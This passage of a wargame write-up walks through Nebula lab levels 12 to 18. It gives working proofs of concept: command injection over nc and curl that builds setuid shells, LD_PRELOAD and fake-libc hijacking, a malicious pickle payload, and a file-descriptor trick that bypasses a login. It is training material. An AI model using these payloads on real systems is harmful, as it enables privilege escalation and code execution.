fail(blue = %d, length = %d)\", blue, length); } write(fd, buf, pink); blue -= pink; } mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0); if(mem == MAP_FAILED) { err(1, \"mmap\"); } process(mem, length); } } I’ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute getflag so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(\nlevel12 Level12’s Description:\n There is a backdoor process listening on port 50001.\n With the description we are provided with the source code of a small Lua program:\nlocal socket = require(\"socket\") local server = assert(socket.bind(\"127.0.0.1\", 50001)) function hash(password) prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\") data = prog:read(\"*all\") prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(\"Password: \") client:settimeout(60) local line, err = client:receive() if not err then print(\"trying \" .. line) -- log from where ;\\ local h = hash(line) if h ~= \"4754a4f4bd5787accd33de887b9250a0691dd198\" then client:send(\"Better luck next time\\n\"); else client:send(\"Congrats, your token is 413**CARRIER LOST**\\n\") end end client:close() end This level had another very obvious command injection vulnerability on the line where a password variable is piped through sha1sum. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a ; character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.\nSo, to solve level12:\nlevel12@nebula:~$ echo \";gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#\" | nc 127.0.0.1 50001 Password: Better luck next time level12@nebula:~$ /var/tmp/flag12 sh-4.2$ getflag You have successfully executed getflag on a target account sh-4.2$ level13 Level13’s Description:\n There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.\n With the description we are provided with the source code of a small C program:\n#include stdlib.h #include unistd.h #include stdio.h #include sys/types.h #include string.h #define FAKEUID 1000 int main(int argc, char **argv, char **envp) { int c; char token[256]; if(getuid() != FAKEUID) { printf(\"Security failure detected. UID %d started us, we expect %d\\n\", getuid(), FAKEUID); printf(\"The system administrators will be notified of this violation\\n\"); exit(EXIT_FAILURE); } // snip, sorry :) printf(\"your token is %s\\n\", token); } This level had me researching for quite some time. I came to learn of ELF DSO’s and LD_PRELOAD. Basically, it is possible to have the dynamic linker preload shared libraries from the LD_PRELOAD environment variable that may allow for some functions to be modified. This article contained most of the magic that was needed to get this level done.\nI decided to ‘override’ the getuid() function so that it would return the value of the FAKEUID constant in the program, instead of the value the real getuid() would have returned. For that to happen, I looked up the arguments for getuid() from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous -shared -fPIC arguments for position independent code and exported the LD_PRELOAD variable prior to running the binary.\nOne important thing to note here is that this ‘hack’ has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the LD_PRELOAD environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override getuid().\nSo, to solve level13:\nlevel13@nebula:/var/tmp$ cp ~flag13/flag13 . level13@nebula:/var/tmp$ cat fake_getuid.c #include uid_t getuid(void) { return 1000; } level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13 your token is b705702b-76a8-42b0-8844-3adabbe5ac58 level13@nebula:/var/tmp$ su - flag13 Password: flag13@nebula:~$ getflag You have successfully executed getflag on a target account level14 Level14’s Description:\n This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)\n Logged in as user level14, we see 2 files in the flag14 directory:\nlevel14@nebula:~$ cd ~flag14 level14@nebula:/home/flag14$ ls -lh total 8.0K -rwsr-x--- 1 flag14 level14 7.2K 2011-12-05 18:59 flag14 -rw------- 1 level14 level14 37 2011-12-05 18:59 token level14@nebula:/home/flag14$ cat token 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW. token obviously being the target to decrypt. Running flag14 tells us that it is expecting a -e flag to encrypt. So, I tested the encryption to see how it behaves:\nlevel14@nebula:/home/flag14$ ./flag14 -e AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^( What immediately jumped out at me was the A’s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:\n#!/usr/bin/python # exploit-exercises level14 cryptor string = 'AABBCCDDEEFFGG' key = 0 result = '' print 'String: {s}\\nStrlen: {l}\\t'.format(s = string, l = len(string)) for char in string: print 'Key: {key}\\tChar: {char}\\tOrd: {ord}\\tRes: {res}'.format( key = key, char = char, ord = ord(char), res = chr(ord(char) + key) ) result += chr(ord(char) + key) key += 1 print '\\nResult: {res}'.format(res = result) Running this meant that the output would be:\n~ # python crypt.py String: AABBCCDDEEFFGG Strlen: 14 Key: 0 Char: A Ord: 65 Res: A Key: 1 Char: A Ord: 65 Res: B Key: 2 Char: B Ord: 66 Res: D Key: 3 Char: B Ord: 66 Res: E Key: 4 Char: C Ord: 67 Res: G Key: 5 Char: C Ord: 67 Res: H Key: 6 Char: D Ord: 68 Res: J Key: 7 Char: D Ord: 68 Res: K Key: 8 Char: E Ord: 69 Res: M Key: 9 Char: E Ord: 69 Res: N Key: 10 Char: F Ord: 70 Res: P Key: 11 Char: F Ord: 70 Res: Q Key: 12 Char: G Ord: 71 Res: S Key: 13 Char: G Ord: 71 Res: T Result: ABDEGHJKMNPQST The same string was checked using the flag14 cryptor:\nlevel14@nebula:/home/flag14$ ./flag14 -e AABBCCDDEEFFGG ABDEGHJKMNPQST A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the token file:\n~ # python decrypt.py String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW. Strlen: 36 Key start = 0 Key: 0 Char: 8 Ord: 56 Res: 8 Key: 1 Char: 5 Ord: 53 Res: 4 Key: 2 Char: 7 Ord: 55 Res: 5 Key: 3 Char: : Ord: 58 Res: 7 Key: 4 Char: g Ord: 103 Res: c Key: 5 Char: 6 Ord: 54 Res: 1 Key: 6 Char: 7 Ord: 55 Res: 1 Key: 7 Char: ? Ord: 63 Res: 8 Key: 8 Char: 5 Ord: 53 Res: - Key: 9 Char: A Ord: 65 Res: 8 Key: 10 Char: B Ord: 66 Res: 8 Key: 11 Char: B Ord: 66 Res: 7 Key: 12 Char: o Ord: 111 Res: c Key: 13 Char: : Ord: 58 Res: - Key: 14 Char: B Ord: 66 Res: 4 Key: 15 Char: t Ord: 116 Res: e Key: 16 Char: D Ord: 68 Res: 4 Key: 17 Char: A Ord: 65 Res: 0 Key: 18 Char: ? Ord: 63 Res: - Key: 19 Char: t Ord: 116 Res: a Key: 20 Char: I Ord: 73 Res: 5 Key: 21 Char: v Ord: 118 Res: a Key: 22 Char: L Ord: 76 Res: 6 Key: 23 Char: D Ord: 68 Res: - Key: 24 Char: K Ord: 75 Res: 3 Key: 25 Char: L Ord: 76 Res: 3 Key: 26 Char: { Ord: 123 Res: a Key: 27 Char: M Ord: 77 Res: 2 Key: 28 Char: Q Ord: 81 Res: 5 Key: 29 Char: P Ord: 80 Res: 3 Key: 30 Char: S Ord: 83 Res: 5 Key: 31 Char: R Ord: 82 Res: 3 Key: 32 Char: Q Ord: 81 Res: 1 Key: 33 Char: W Ord: 87 Res: 6 Key: 34 Char: W Ord: 87 Res: 5 Key: 35 Char: . Ord: 46 Res: Result: 8457c118-887c-4e40-a5a6-33a25353165 So, to solve level14:\nlevel14@nebula:/home/flag14$ su - flag14 Password: flag14@nebula:~$ getflag You have successfully executed getflag on a target account level15 Level15’s Description:\n strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary. You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth. Clean up after yourself :)\n Logged in as user level15, we see 1 file in the flag15 directory called flag15. Running it simply tells us to strace it!. Running it with strace immediately reveals a whole bunch of interesting things about flag15:\nlevel15@nebula:/home/flag15$ strace ./flag15 execve(\"./flag15\", [\"./flag15\"], [/* 20 vars */]) = 0 brk(0) = 0x88c9000 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000 access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/i686/sse2/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/i686/sse2/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/i686/sse2\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/i686/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/i686/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/i686/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/i686\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/sse2/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/sse2/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/sse2/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/sse2\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/tls/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/tls\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/i686/sse2/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/i686/sse2/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/i686/sse2/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/i686/sse2\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/i686/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/i686/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/i686/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/i686\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/sse2/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/sse2/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/sse2/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/sse2\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15/cmov\", 0xbfd0bf54) = -1 ENOENT (No such file or directory) open(\"/var/tmp/flag15/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\"/var/tmp/flag15\", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0 open(\"/etc/ld.so.cache\", O_RDONLY) = 3 fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0 mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000 close(3) = 0 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) open(\"/lib/i386-linux-gnu/libc.so.6\", O_RDONLY) = 3 read(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0p\\222\\1\\0004\\0\\0\\0\"..., 512) = 512 fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0 mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000 mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000 mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000 close(3) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000 set_thread_area({entry_number:-1 - 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 mprotect(0xfee000, 8192, PROT_READ) = 0 mprotect(0x8049000, 4096, PROT_READ) = 0 mprotect(0x199000, 4096, PROT_READ) = 0 munmap(0xb7862000, 33815) = 0 fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000 write(1, \"strace it!\\n\", 11strace it! ) = 11 exit_group(11) = ? There are plenty of attempts to load libc.so.6 from various locations! I checked out what is in /var/tmp and found the original flag15 folder there. It was empty. My initial thought were I need to give it a libc.so.6 to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.\nThis challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with gcc, it is possible to add hwcap support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a rpath. In the case of flag15, the RPATH is set to /var/tmp/flag15. We can see this using readelf and looking at the dynamic section:\nlevel15@nebula:/home/flag15$ readelf -d ./flag15 Dynamic section at offset 0xf20 contains 21 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] 0x0000000c (INIT) 0x80482c0 0x0000000d (FINI) 0x80484ac [...] Ok, so that kinda explained the why its loading libc.so.6 from there, but not really the ‘how this can be useful’. I was still a little stuck on the previous LD_PRELOAD hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.\nI was a little unsure how to get something useful going from here. I touched a file called libc.so.6 in /var/tmp/flag15/ and launched the binary, just to get a starting point:\nlevel15@nebula:/var/tmp/flag15$ touch libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 /home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at flag15 and check which libc function I could “override??” from the RELO table:\nlevel15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15 /home/flag15/flag15: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ff0 R_386_GLOB_DAT __gmon_start__ 0804a000 R_386_JUMP_SLOT puts 0804a004 R_386_JUMP_SLOT __gmon_start__ 0804a008 R_386_JUMP_SLOT __libc_start_main puts() seems like an ok target for me! This is probably the function used to print the strace it! message. At this stage I figured I could take the same route as I did with the previous LD_PRELOAD attack, except this time I just ‘fake’ it in my fake libc. I looked up the puts() arguments from the man page again and started a new function:\nlevel15@nebula:/var/tmp/flag15$ cat fake_libc.c #include int puts(const char *s) { printf(\"Not the real puts!\\n\"); } level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15) /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6) /home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference Ow, that exploded pretty badly it seems. From the error message I figured the function __cxa_finalize simply did not exist in my library, so all I had to do was add it… Right? I googled the function arguments and added it to my fake libc:\nlevel15@nebula:/var/tmp/flag15$ cat fake_libc.c #include void __cxa_finalize(void * d) { } int puts(const char *s) { printf(\"Not the real puts!\\n\"); } level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15) /home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference Oh! New error. I guess I was making progress. This time there is apparently no __libc_start_main in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for flag15. Anyways, as with __cxa_finalize, I Googled the function arguments for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of puts, so I went ahead and deleted the other functions:\nlevel15@nebula:/var/tmp/flag15$ cat fake_libc.c #include int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { return 0; } level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15) Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version-filename == ((void *)0) || ! _dl_name_match_p (version-filename, map)' failed! Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to ldd flag15 again now that my fake libc is available:\nlevel15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15) linux-gate.so.1 = (0x00e47000) libc.so.6 = /var/tmp/flag15/libc.so.6 (0x00761000) The search term no version information available (required by was the magic that finally got me towards an answer! I came across this and this post which talks about custom linking scripts. Basically, if I were to create a file with the contents GLIBC_2.0 {}; in it and tell the linker at compile time (with -Wl) about it, then my problem will go away :)\nlevel15@nebula:/var/tmp/flag15$ cat version.ld GLIBC_2.0 { }; level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15 linux-gate.so.1 = (0x002b3000) libc.so.6 = /var/tmp/flag15/libc.so.6 (0x00ca0000) w00t. My ldd Error went away :)\nlevel15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3' not found (required by /var/tmp/flag15/libc.so.6) Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with -Bstatic and -static-libgcc we tell the compiler not to link against shared libraries. So, I added these too:\nlevel15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 Segmentation fault And now we are segfaulting. Great! Not! I poked around gdb a little and prodded around. Eventually I figured I should check if my __libc_start_main function is being called before the crash:\nlevel15@nebula:/var/tmp/flag15$ cat fake_libc.c #include int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { printf(\"hi mom!\\n\"); /* Added this line! */ return 0; } level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 hi mom! Segmentation fault Yes! :D So even though I am causing flag15 to crash, I have managed to introduce some code to it. I finally decided to add the system() call and recompile my fake libc.\nSo, to solve level15:\nlevel15@nebula:/var/tmp/flag15$ cat fake_libc.c #include int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { system(\"/bin/sh\"); return 0; } level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6 level15@nebula:/var/tmp/flag15$ ~flag15/flag15 sh-4.2$ getflag You have successfully executed getflag on a target account level16 Level16’s Description:\n There is a perl script running on port 1616.\n With the description we are provided with the source code of a small Perl program:\n#!/usr/bin/env perl use CGI qw{param}; print \"Content-type: text/html\\n\\n\"; sub login { $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\\s.*//; # strip everything after a space @output = `egrep \"^$username\" /home/flag16/userdb.txt 2\u00261`; foreach $line (@output) { ($usr, $pw) = split(/:/, $line); if($pw =~ $password) { return 1; } } return 0; } sub htmlz { print(\"Login resuls\"); if($_[0] == 1) { print(\"Your login was accepted\"); } else { print(\"Your login failed\"); } print(\"Would you like a cookie?\\n\"); } htmlz(login(param(\"username\"), param(\"password\"))); This script has a seemingly less obvious command injection vulnerability. The egrep command eventually gets the $username variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.\nSimilarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the ${A,,} operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable A and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit ${A,,} and commented the rest of the line out with a hash (#).\nSo, to solve level16:\nlevel16@nebula:~$ vim /var/tmp/flag16.sh level16@nebula:~$ chmod +x /var/tmp/flag16.sh level16@nebula:~$ cat /var/tmp/flag16.sh #!/bin/sh gcc /var/tmp/shell.c -o /var/tmp/flag16 chmod 4777 /var/tmp/flag16 On my host machine, I requested the web page hosting the perl script, triggering /var/tmp/flag16 to run:\n~ » curl -v \"http://192.168.217.239:1616/index.cgi?$(python -c 'import urllib; print urllib.urlencode({ \"username\" : \"\"\"\")\" * Hostname was NOT found in DNS cache * Trying 192.168.217.239... * Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)  GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23\u0026password=a HTTP/1.1  User-Agent: curl/7.37.1  Host: 192.168.217.239:1616  Accept: */*  * HTTP 1.0, assume close after body 200 OK Login resulsYour login failedWould you like a cookie? * Closing connection 0 And then, just to read the flag:\nlevel16@nebula:~$ /var/tmp/flag16 sh-4.2$ getflag You have successfully executed getflag on a target account level17 Level17’s Description:\n There is a python script listening on port 10007 that contains a vulnerability.\n With the description we are provided with the source code of a small Python program:\n#!/usr/bin/python import os import pickle import time import socket import signal signal.signal(signal.SIGCHLD, signal.SIG_IGN) def server(skt): line = skt.recv(1024) obj = pickle.loads(line) for i in obj: clnt.send(\"why did you send me \" + i + \"?\\n\") skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) skt.bind(('0.0.0.0', 10007)) skt.listen(10) while True: clnt, addr = skt.accept() if(os.fork() == 0): clnt.send(\"Accepted connection from %s:%d\" % (addr[0], addr[1])) server(clnt) exit(1) With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a __reduce__ method to pickle and send that over the socket that this code is listening on.\nSo, to solve level17:\nlevel17@nebula:/var/tmp/flag17-prep$ cat sploit.py from netcat import Netcat import pickle import os command = \"\"\"gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17\"\"\" # setup the pickle class DoCmd(object): def __reduce__(self): return (os.system, ('{cmd}'.format(cmd = command),)) nc = Netcat('127.0.0.1', 10007) nc.read() nc.write(pickle.dumps(DoCmd())) nc.close() level17@nebula:/var/tmp/flag17-prep$ python sploit.py level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17 sh-4.2$ getflag You have successfully executed getflag on a target account level18 Level18’s Description:\n Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.\n With the description we are provided with the source code of a small C program:\n#include #include #include #include #include #include #include  struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \\ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile \u0026\u0026 globals.verbose = num) \\ fprintf(globals.debugfile, __VA_ARGS__)  #define PWFILE \"/home/flag18/password\"  void login(char *pw) { FILE *fp; fp = fopen(PWFILE, \"r\"); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf(\"Unable to read password file %s\\n\", PWFILE); return; } fclose(fp); if(strcmp(pw, file) != 0) return; } dprintf(\"logged in successfully (with%s password file)\\n\", fp == NULL ? \"out\" : \"\"); globals.loggedin = 1; } void notsupported(char *what) { char *buffer = NULL; asprintf(\u0026buffer, \"-- [%s] is unsupported at this current time.\\n\", what); dprintf(what); free(buffer); } void setuser(char *user) { char msg[128]; sprintf(msg, \"unable to set user to '%s' -- not supported.\\n\", user); printf(\"%s\\n\", msg); } int main(int argc, char **argv, char **envp) { char c; while((c = getopt(argc, argv, \"d:v\")) != -1) { switch(c) { case 'd': globals.debugfile = fopen(optarg, \"w+\"); if(globals.debugfile == NULL) err(1, \"Unable to open %s\", optarg); setvbuf(globals.debugfile, NULL, _IONBF, 0); break; case 'v': globals.verbose++; break; } } dprintf(\"Starting up. Verbose level = %d\\n\", globals.verbose); setresgid(getegid(), getegid(), getegid()); setresuid(geteuid(), geteuid(), geteuid()); while(1) { char line[256]; char *p, *q; q = fgets(line, sizeof(line)-1, stdin); if(q == NULL) break; p = strchr(line, '\\n'); if(p) *p = 0; p = strchr(line, '\\r'); if(p) *p = 0; dvprintf(2, \"got [%s] as input\\n\", line); if(strncmp(line, \"login\", 5) == 0) { dvprintf(3, \"attempting to login\\n\"); login(line + 6); } else if(strncmp(line, \"logout\", 6) == 0) { globals.loggedin = 0; } else if(strncmp(line, \"shell\", 5) == 0) { dvprintf(3, \"attempting to start shell\\n\"); if(globals.loggedin) { execve(\"/bin/sh\", argv, envp); err(1, \"unable to execve\"); } dprintf(\"Permission denied\\n\"); } else if(strncmp(line, \"logout\", 4) == 0) { globals.loggedin = 0; } else if(strncmp(line, \"closelog\", 8) == 0) { if(globals.debugfile) fclose(globals.debugfile); globals.debugfile = NULL; } else if(strncmp(line, \"site exec\", 9) == 0) { notsupported(line + 10); } else if(strncmp(line, \"setuser\", 7) == 0) { setuser(line + 8); } } return 0; } Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does execve(\"/bin/sh\", argv, envp);.\nI noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.\nLots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is /home/flag18/password and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p\nSo what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a closelog command too. So, I started to play around with ulimit, gradually reducing -n until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.\nWithout setting the max open files, a sample run would be:\nlevel18@nebula:~$ touch /tmp/log level18@nebula:~$ tail -f /tmp/log \u0026 [1] 6499 level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log Starting up. Verbose level = 3 login egg got [login egg] as input attempting to login shell got [shell] as input attempting to start shell Permission denied Dropping the max open files to 4 though, we get:\nlevel18@nebula:~$ ulimit -n 4 level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log -sh: start_pipeline: pgrp pipe: Too many open files tail: /tmp/log: file truncated Starting up. Verbose level = 3 login egg got [login egg] as input attempting to login logged in successfully (without password file) shell got [shell] as input attempting to start shell /home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24 Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that closelog command that will free up a file descriptor. Rerunning the above but calling closelog before we call shell results in:\nlevel18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log -sh: start_pipeline: pgrp pipe: Too 